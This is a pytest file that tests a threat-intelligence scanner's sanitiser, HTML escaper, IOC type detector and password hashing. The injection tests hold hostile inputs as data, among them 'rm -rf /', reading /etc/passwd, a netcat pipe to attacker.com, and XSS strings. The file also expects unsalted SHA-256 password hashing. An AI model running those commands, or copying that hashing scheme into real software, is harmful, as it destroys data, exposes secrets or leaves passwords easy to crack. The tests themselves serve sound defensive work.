"""
IOC Threat Scanner - Security Tests
Author: Adi Cohen
License: MIT

These tests verify the security functions work correctly.
"""

import pytest
import sys
import os

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestSanitizeIOC:
    """Test cases for IOC sanitization function."""

    def test_valid_ipv4(self):
        """Test that valid IPv4 addresses pass sanitization."""
        from ioc_scanner import sanitize_ioc
        assert sanitize_ioc("192.168.1.1") == "192.168.1.1"
        assert sanitize_ioc("8.8.8.8") == "8.8.8.8"
        assert sanitize_ioc("10.0.0.1") == "10.0.0.1"

    def test_valid_domain(self):
        """Test that valid domains pass sanitization."""
        from ioc_scanner import sanitize_ioc
        assert sanitize_ioc("example.com") == "example.com"
        assert sanitize_ioc("sub.example.com") == "sub.example.com"
        assert sanitize_ioc("test-site.org") == "test-site.org"

    def test_valid_hash(self):
        """Test that valid hashes pass sanitization."""
        from ioc_scanner import sanitize_ioc
        md5 = "d41d8cd98f00b204e9800998ecf8427e"
        sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
        sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

        assert sanitize_ioc(md5) == md5
        assert sanitize_ioc(sha1) == sha1
        assert sanitize_ioc(sha256) == sha256

    def test_empty_input(self):
        """Test that empty input returns None."""
        from ioc_scanner import sanitize_ioc
        assert sanitize_ioc("") is None
        assert sanitize_ioc(None) is None
        assert sanitize_ioc("   ") is None

    def test_newline_injection(self):
        """Test that newline characters are rejected."""
        from ioc_scanner import sanitize_ioc
        assert sanitize_ioc("192.168.1.1\nmalicious") is None
        assert sanitize_ioc("example.com\r\nevil.com") is None
        assert sanitize_ioc("hash\x00value") is None

    def test_html_injection(self):
        """Test that HTML characters are rejected."""
        from ioc_scanner import sanitize_ioc
        assert sanitize_ioc("<script>alert(1)</script>") is None
        assert sanitize_ioc("example.com<img>") is None
        assert sanitize_ioc('test"onclick="alert(1)"') is None

    def test_shell_injection(self):
        """Test that shell metacharacters are rejected."""
        from ioc_scanner import sanitize_ioc
        assert sanitize_ioc("192.168.1.1; rm -rf /") is None
        assert sanitize_ioc("example.com && cat /etc/passwd") is None
        assert sanitize_ioc("test | nc attacker.com 4444") is None
        assert sanitize_ioc("`whoami`") is None
        assert sanitize_ioc("$(id)") is None

    def test_length_limit(self):
        """Test that overly long inputs are rejected."""
        from ioc_scanner import sanitize_ioc
        long_input = "a" * 257
        assert sanitize_ioc(long_input) is None

        # Just under limit should pass
        valid_input = "a" * 256
        assert sanitize_ioc(valid_input) == valid_input

    def test_whitespace_trimming(self):
        """Test that whitespace is properly trimmed."""
        from ioc_scanner import sanitize_ioc
        assert sanitize_ioc("  192.168.1.1  ") == "192.168.1.1"
        assert sanitize_ioc("\texample.com\t") == "example.com"


class TestEscapeHTML:
    """Test cases for HTML escaping function."""

    def test_basic_escaping(self):
        """Test that basic HTML characters are escaped."""
        from ioc_scanner import escape_html
        assert escape_html("<script>") == "&lt;script&gt;"
        assert escape_html('"quoted"') == "&quot;quoted&quot;"
        assert escape_html("'single'") == "&#x27;single&#x27;"
        assert escape_html("a & b") == "a &amp; b"

    def test_xss_prevention(self):
        """Test that XSS payloads are neutralized."""
        from ioc_scanner import escape_html
        xss_payload = '<img src=x onerror="alert(1)">'
        escaped = escape_html(xss_payload)
        assert "<" not in escaped
        assert ">" not in escaped
        assert '"' not in escaped

    def test_empty_input(self):
        """Test that empty input returns empty string."""
        from ioc_scanner import escape_html
        assert escape_html("") == ""
        assert escape_html(None) == ""

    def test_safe_content(self):
        """Test that safe content passes through unchanged."""
        from ioc_scanner import escape_html
        assert escape_html("192.168.1.1") == "192.168.1.1"
        assert escape_html("example.com") == "example.com"
        assert escape_html("normal text") == "normal text"


class TestDetectType:
    """Test cases for IOC type detection."""

    def test_ipv4_detection(self):
        """Test IPv4 address detection."""
        from ioc_scanner import detect_type
        assert detect_type("192.168.1.1") == "ipv4"
        assert detect_type("8.8.8.8") == "ipv4"
        assert detect_type("255.255.255.255") == "ipv4"

    def test_ipv6_detection(self):
        """Test IPv6 address detection."""
        from ioc_scanner import detect_type
        assert detect_type("::1") == "ipv6"
        assert detect_type("2001:0db8:85a3:0000:0000:8a2e:0370:7334") == "ipv6"

    def test_domain_detection(self):
        """Test domain detection."""
        from ioc_scanner import detect_type
        assert detect_type("example.com") == "domain"
        assert detect_type("sub.example.com") == "domain"

    def test_hash_detection(self):
        """Test hash detection by length."""
        from ioc_scanner import detect_type
        assert detect_type("d41d8cd98f00b204e9800998ecf8427e") == "hash"  # MD5
        assert detect_type("da39a3ee5e6b4b0d3255bfef95601890afd80709") == "hash"  # SHA1
        assert detect_type("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855") == "hash"  # SHA256


class TestPasswordSecurity:
    """Test cases for password hashing and verification."""

    def test_password_hashing(self):
        """Test that passwords are properly hashed."""
        from ioc_scanner import hash_password
        password = "test_password_123"
        hashed = hash_password(password)

        # Hash should be 64 characters (SHA-256 hex)
        assert len(hashed) == 64
        # Hash should be deterministic
        assert hash_password(password) == hashed
        # Different passwords should have different hashes
        assert hash_password("different") != hashed

    def test_password_verification(self):
        """Test password verification against stored hash."""
        from ioc_scanner import hash_password, verify_password
        password = "secure_password"
        stored_hash = hash_password(password)

        assert verify_password(password, stored_hash) is True
        assert verify_password("wrong_password", stored_hash) is False
        assert verify_password("", stored_hash) is False


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
